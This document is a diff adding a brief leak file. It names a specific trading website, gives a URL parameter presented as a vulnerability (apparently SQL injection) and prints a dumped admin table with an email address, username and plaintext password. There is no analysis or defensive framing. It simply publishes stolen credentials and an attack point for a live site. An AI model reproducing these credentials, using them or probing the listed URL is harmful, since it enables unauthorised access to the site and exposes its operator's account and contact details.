@@ -1,0 +1,9 @@
+Web-site:https://www.maytrade.net
+vulnerability: https://www.maytrade.net/new.php?id=1
+
+Dumped:
++---------------------+---------+-----------+--------------+----------------+
+| AdminEmail          | AdminID | AdminName | AdminPass    | AdminTime      | 
++---------------------+---------+-----------+--------------+----------------+
+| info@alamwahdit.com | 1       | admin     | Gehad5185113 | 06 / 04 / 2020 | 
++---------------------+---------+-----------+--------------+----------------+
